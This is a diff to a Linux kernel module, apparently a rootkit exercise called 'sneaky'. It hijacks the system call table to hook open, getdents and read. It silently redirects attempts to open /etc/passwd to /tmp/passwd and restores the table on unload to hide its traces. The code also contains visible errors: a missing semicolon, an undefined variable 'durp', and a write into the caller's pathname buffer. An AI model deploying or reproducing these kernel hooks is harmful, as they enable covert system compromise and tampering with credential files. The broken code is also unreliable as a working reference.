@@ -41,13 +41,29 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
-  printk(KERN_INFO "Very, very Sneaky!\n");
+  // printk(KERN_INFO "Very, very Sneaky!\n");
+  if (!strcmp(pathname, "/etc/passwd")) {
+    copy_to_user(pathname, "/tmp/passwd", 12);
+  }
   return original_call(pathname, flags);
 }
+
+//Define our new sneaky version of the 'getdents' syscall
+asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+  return original_getdents(fd, durp, count);
+}
+
+//Define our new sneaky version of the 'read' syscall
+asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
+  return original_read(fd, buf, count);
+}
+
 
 
 //The code that gets executed when the module is loaded
@@ -99,7 +115,9 @@ static void exit_sneaky_module(void)
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
-
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
